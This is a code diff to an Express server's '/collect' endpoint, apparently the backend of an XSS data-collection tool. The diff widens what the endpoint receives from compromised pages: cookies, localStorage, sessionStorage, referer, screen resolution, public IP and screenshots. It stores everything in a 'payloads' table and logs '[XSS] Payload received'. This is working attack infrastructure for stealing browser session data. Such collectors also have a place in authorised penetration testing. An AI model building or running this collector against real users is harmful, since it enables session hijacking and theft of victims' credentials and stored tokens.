@@ -97,18 +97,44 @@ app.get('/logout', (req, res) => {
 });
 
 app.post('/collect', (req, res) => {
-  const { url, userAgent, ua, screenshot, href } = req.body;
-  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-  const time = new Date().toISOString();
+  const {
+  url,
+  cookies,  // should be a string, e.g. "key=value; key2=value2"
+  userAgent,
+  referer,
+  screenResolution,
+  localStorage,
+  sessionStorage,
+  ipAddress,
+  screenshot
+} = req.body;
 
-  //Debugging output
-  console.log('[+] Payload received:', req.body);
-  db.run(
-    `INSERT INTO payloads (url, userAgent, screenshot, ip, time) VALUES (?, ?, ?, ?, ?)`,
-    [url, userAgent || ua, screenshot || null, ip, time]
-  );
+  // Insert into DB
+  db.run(`
+    INSERT INTO payloads (
+      url, referer, userAgent, screenResolution,
+      cookies, localStorage, sessionStorage,
+      publicIPv4, screenshot, ip, time
+    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+  `, [
+    url,
+    referer,
+    userAgent,
+    screenResolution,
+    cookies,
+    localStorage,
+    sessionStorage,
+    ipAddress?.publicIPv4 || "Unavailable",
+    screenshot,
+    req.headers['x-forwarded-for'] || req.connection.remoteAddress,
+    new Date().toISOString()
+  ], err => {
+    if (err) console.error(err);
+    else console.log('[XSS] Payload received:', req.body);
+  });
 
   res.sendStatus(200);
+
 });
 
 // Protected routes
